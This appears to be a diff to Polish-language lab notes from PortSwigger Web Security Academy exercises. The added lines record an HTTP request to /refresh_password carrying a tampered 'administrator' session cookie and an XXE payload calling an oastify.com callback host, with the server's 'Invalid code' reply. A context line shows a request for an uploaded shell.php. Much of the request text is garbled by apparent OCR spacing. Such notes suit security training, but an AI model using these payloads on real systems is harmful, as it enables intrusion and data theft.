@@ -252,7 +252,7 @@ GET /blogImage/shell.php
 https://github.com/user-attachments/assets/da5b67c8-aac6-44ca-8f20-fb0287aa69e8
 
 
-I PODEJŚCIE, MASZYNKA B [Web Cache+idlogged_cookie+?]
+I PODEJŚCIE, MASZYNKA B [Web Cache+idlogged_cookie+2fa broken logic?? code]
 
 
 Maszynka B stage1: Web cache poisoning dopiero na fukcji szukania znaleziony
@@ -379,10 +379,50 @@ div class="footer-wrapper">
 
 
 
+POST /refresh_password HTTP/2
+Host: Oae6001c04191df583de5fla00f700b4.web-security-academy. net
+Cookie: lab=
+46%7cMCwCFE5HcSrj dqut f70YPj 4UGeC%2bDWc8AhQ%2fPCu4NY30uJAOeAPpw02J80ESul XZMVf2W%2fTK1t T JOHHm9fPgsy 817z5AnoY
+oBJUwcvk8y 6W4Eqonuuq4%2fSae 4Hxo Am AqCYzNmOVTj PWMsxNraoOsdpgqQzwc73l nWCLSb0%2fGszV2XDk%3d; session=
+%7b%22username%22%3a%22administ rat or%22%2c%22isl oggedin%22%3afal se% 7d - -MCsCEy OqwGbOfzCj 8TYi9t D55rX1SLQCFHZ
+ZZzGJ80%2bZK5FG02nwvh%2bl Qlpb
+Content -Length: 172
+Cache-Control : max-age=0
+Sec-Ch-Ua : "Not-A. Brand" ; v="24", "Chromium" ; v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Plat form: "Linux"
+Accept -Language : en-US, en; q=0.9
+Origin: https://Oae600lc04191df583de5fla00f700b4.web-security-academy.net
+Content -Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0
+Safari/537.36
+Accept :
+text/html,application/xhtml+xml,application/xml; q=0.9,image/avif,image/webp,image/apng,*/ *; q=0.8, applicati
+on/signed-exchange; v=b3; q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User : ?1
+Sec-Fetch-Dest : document
+Referer: https://Oae600lc04191df583de5fla00f700b4.web-security-academy.net/refresh_password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=G4Zst X2gwRt uSAMJS2JVKWhBoot fNYue&code=
+<! DOCTYPE+foo+[+ <! ENTITY+xxe+SYSTEM+"http%3a//gp9qlnzuad0d7h86yam89avuoluci56u. oastify.com">+] ><foo>%26xxe
+%3b</foo>&password=null
 
 
+HTTP/2 400 Bad Request
+2 Content-Type: application/json; charset=utf-8
+Set -Cookie: session=
+%7b%22username%22%3anull%2c%22isl oggedin%22%3afal se%7d - -MCwCFCkr XMUVSIt B%2fY1QrG3j G9t 1up%2b JAhQemn%2fa%2fw
+4J0w3de8VSpwXspW%2bIXQ%3d%3d; Secure; SameSite=None
+Cache-Cont rol : no-cache
+X-Frame-Options: SAMEORIGIN
+Content -Length: 14
 
-
+"Invalid code"
 
 
 
